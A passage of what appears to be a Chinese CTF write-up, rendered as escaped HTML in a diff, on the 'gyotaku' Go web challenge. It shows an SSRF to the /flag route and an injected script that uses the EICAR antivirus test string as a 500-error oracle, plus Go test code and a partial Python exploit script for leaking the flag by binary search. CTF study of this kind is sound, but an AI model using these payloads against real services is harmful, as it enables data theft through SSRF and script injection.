+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">ioutil&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">WriteFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">path&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Join&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">GyotakuDir&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">gid&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="nx">buf&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Bytes&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="mo">0644&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nx">err&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这段将&lt;code>GyotakuData&lt;/code>写入了一个文件当中，并且跟我们上文提到的写文件方法一致，判断了是否写入成功，不成功就返回&lt;code>err&lt;/code>，并且在这里三个写入的参数我们都可控。&lt;/p>
+&lt;p>所以我们现在可以有一个大致思路，通过提交&lt;code>{&amp;quot;url&amp;quot;:&amp;quot;http://127.0.0.1/flag&amp;quot;}&lt;/code>到&lt;code>/gyotaku&lt;/code>路由，构成一个 SSRF ，这时候&lt;code>/flag&lt;/code>路由会返回 flag ，通过以上代码解析，flag 被放到了&lt;code>Data&lt;/code>中，接着我们再看一下&lt;code>GyotakuData&lt;/code>结构体&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">type&lt;/span> &lt;span class="nx">GyotakuData&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">URL&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="s">`json:&amp;#34;url&amp;#34;`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Data&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="s">`json:&amp;#34;data&amp;#34;`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">UserName&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="s">`json:&amp;#34;username&amp;#34;`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>如果中间是&lt;code>Data&lt;/code>是我们&lt;code>&amp;lt;body&amp;gt;&lt;/code>标签的 secret 数据，那么&lt;code>UserName&lt;/code>我们就需要一个&lt;code>&amp;lt;/body&amp;gt;&lt;/code>标签将其闭合，前面 URL 怎么构造好呢？&lt;/p>
+&lt;p>因为&lt;code>/flag&lt;/code>路由是不处理任何 GET 参数的，所以我们可以尝试把我们需要构造的 payload 放到 URL 参数当中，这样就可以构造了我们上文的 Payload 了，我们需要构造的大致就是以下这样：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">type&lt;/span> &lt;span class="nx">GyotakuData&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">URL&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="s">&amp;#34;http://127.0.0.1/flag?&amp;lt;script&amp;gt;var num = 90;var body = document.body.innerHTML[0].charCodeAt(0);var mal = &amp;#39;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&amp;#39; + {[num] : &amp;#39;*&amp;#39;}[Math.min(num ,body)];eval(mal);&amp;lt;/script&amp;gt;&amp;lt;body&amp;gt;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Data&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="s">&amp;#34;flag{test}&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">UserName&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="s">&amp;#34;&amp;lt;/body&amp;gt;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这样服务把&lt;code>GyotakuData&lt;/code>结构体写入文件当中了:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>&lt;span class="n">GyotakuData&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="n">URL&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="n">Data&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="n">UserName&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="mf">127.0&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">0.1&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">flag&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="n">script&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="k">var&lt;/span> &lt;span class="n">num&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">90&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">var&lt;/span> &lt;span class="n">body&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">document&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">body&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">innerHTML&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">charCodeAt&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="k">var&lt;/span> &lt;span class="n">mal&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&amp;#39;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="p">{[&lt;/span>&lt;span class="n">num&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;*&amp;#39;&lt;/span>&lt;span class="p">}[&lt;/span>&lt;span class="n">Math&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">min&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">num&lt;/span> &lt;span class="p">,&lt;/span>&lt;span class="n">body&lt;/span>&lt;span class="p">)];&lt;/span>&lt;span class="n">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">mal&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="o">&amp;lt;/&lt;/span>&lt;span class="n">script&lt;/span>&lt;span class="o">&amp;gt;&amp;lt;&lt;/span>&lt;span class="n">body&lt;/span>&lt;span class="o">&amp;gt;...&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="n">test&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="o">...&amp;lt;/&lt;/span>&lt;span class="n">body&lt;/span>&lt;span class="o">&amp;gt;...&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>为了方便阅读，上面我用&lt;code>...&lt;/code>代替了不可见字符，可以用以下测试代码进行测试：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">package&lt;/span> &lt;span class="nx">main&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="p">(&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;bytes&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;encoding/gob&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s">&amp;#34;io/ioutil&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">type&lt;/span> &lt;span class="nx">GyotakuData&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">URL&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="s">`json:&amp;#34;url&amp;#34;`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Data&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="s">`json:&amp;#34;data&amp;#34;`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">UserName&lt;/span> &lt;span class="kt">string&lt;/span> &lt;span class="s">`json:&amp;#34;username&amp;#34;`&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">url&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="s">&amp;#34;http://127.0.0.1/flag?&amp;lt;script&amp;gt;var num = 90;var body = document.body.innerHTML[0].charCodeAt(0);var mal = &amp;#39;X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H&amp;#39; + {[num] : &amp;#39;*&amp;#39;}[Math.min(num ,body)];eval(mal);&amp;lt;/script&amp;gt;&amp;lt;body&amp;gt;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">body&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="s">&amp;#34;flag{test}&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">username&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="s">&amp;#34;&amp;lt;/body&amp;gt;&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">gyotakudata&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">GyotakuData&lt;/span>&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">URL&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">url&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">Data&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">body&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">UserName&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">username&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">buf&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">bytes&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewBuffer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kc">nil&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">gob&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">NewEncoder&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">buf&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nf">Encode&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">gyotakudata&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">ioutil&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">WriteFile&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;test.txt&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">buf&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Bytes&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="mo">0644&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>这样只要我们每次控制 num 的值，我们就可以在服务器 500 的时候判断我们设立的条件是否成立了。这里直接给出 TokyoWesterns 的 exp 脚本，他们使用了二分法加快判断：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">requests&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">URL&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s2">&amp;#34;http://192.168.122.78&amp;#34;&lt;/span> &lt;span class="c1"># changeme&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">randstr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">import&lt;/span> &lt;span class="nn">random&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">import&lt;/span> &lt;span class="nn">string&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">chars&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">string&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ascii_uppercase&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">string&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ascii_lowercase&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">string&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">digits&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">join&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="n">random&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">choice&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">chars&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">for&lt;/span> &lt;span class="n">_&lt;/span> &lt;span class="ow">in&lt;/span> &lt;span class="nb">range&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">n&lt;/span>&lt;span class="p">)])&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">trigger&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">c&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">idx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sess&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kn">import&lt;/span> &lt;span class="nn">string&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">prefix&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">randstr&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">prefix&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;&amp;lt;script&amp;gt;f=function(n){eval(&amp;#39;X5O!P%@AP[4&lt;/span>&lt;span class="se">\\\\&lt;/span>&lt;span class="s1">PZX54(P^)7CC)7}$$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$$H+H&amp;#39;+{$&lt;/span>&lt;span class="si">{c}&lt;/span>&lt;span class="s1">:&amp;#39;*&amp;#39;}[Math.min($&lt;/span>&lt;span class="si">{c}&lt;/span>&lt;span class="s1">,n)])};f(document.body.innerHTML[$&lt;/span>&lt;span class="si">{idx}&lt;/span>&lt;span class="s1">].charCodeAt(0));&amp;lt;/script&amp;gt;&amp;lt;body&amp;gt;&amp;#39;&amp;#39;&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">p&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">string&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">Template&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">p&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">substitute&lt;/span>&lt;span class="p">({&lt;/span>&lt;span class="s1">&amp;#39;idx&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">idx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;c&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">c&lt;/span>&lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">req&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">sess&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">post&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">URL&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s1">&amp;#39;/gyotaku&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="s1">&amp;#39;url&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s1">&amp;#39;http://127.0.0.1/flag?a=&amp;#39;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p&lt;/span>&lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="n">req&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">json&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">leak&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">idx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sess&lt;/span>&lt;span class="p">):&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">l&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x100&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">while&lt;/span> &lt;span class="n">h&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">l&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">m&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">h&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">l&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">//&lt;/span> &lt;span class="mi">2&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">gid&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">trigger&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">m&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">idx&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">sess&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">if&lt;/span> &lt;span class="n">sess&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">URL&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="s1">&amp;#39;/gyotaku/&amp;#39;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">gid&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">status_code&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="mi">500&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">l&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">m&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">else&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">h&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">m&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nb">chr&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">l&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">sess&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">requests&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="p">()&lt;/span>
